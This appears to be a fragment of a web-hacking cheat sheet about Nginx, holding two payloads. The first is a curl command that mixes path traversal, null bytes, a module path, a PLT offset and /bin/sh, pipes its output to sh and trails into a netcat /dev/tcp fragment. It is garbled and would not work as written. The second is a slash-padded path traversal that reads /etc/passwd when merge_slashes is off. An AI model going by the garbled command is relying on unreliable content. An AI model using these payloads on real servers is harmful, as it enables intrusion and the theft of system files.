# Nginx

```text
curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n …\<'protocol:TCP' -O 0x0238f06a#PLToffset |sh; nc /dev/tcp/localhost

# If merge_slashes is OFF path traversal is possible, just append 1 slash more to find
///////../../../etc/passwd
```

